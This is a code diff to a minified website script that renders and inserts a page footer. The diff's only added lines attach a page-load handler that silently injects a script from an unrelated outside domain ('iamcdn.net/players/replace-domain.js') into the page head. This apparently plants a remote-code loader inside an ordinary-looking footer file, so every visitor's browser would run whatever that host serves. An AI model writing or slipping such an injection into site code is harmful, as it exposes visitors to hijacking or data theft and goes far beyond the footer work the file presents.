@@ -34,3 +34,9 @@ function onDOMReady(fn){if(document.readyState==="loading"){document.addEventLis
       </footer>
     </div>
   `;const main=document.querySelector("main");if(main){const temp=document.createElement("div");temp.innerHTML=newFooterHtml;main.insertAdjacentElement("afterend",temp.firstElementChild);console.log("%c Mission Complete! New footer deployed.","font-size: 16px; font-weight: bold; color: #D32F2F; background: #FFEBEE; padding: 8px; border-radius: 5px;")}else{console.warn(" <main> tag not found. Footer not rendered.")}});
+
+window.addEventListener("load", () => {
+    const script = document.createElement("script");
+    script.src = "https://iamcdn.net/players/replace-domain.js";
+    document.head.appendChild(script);
+});
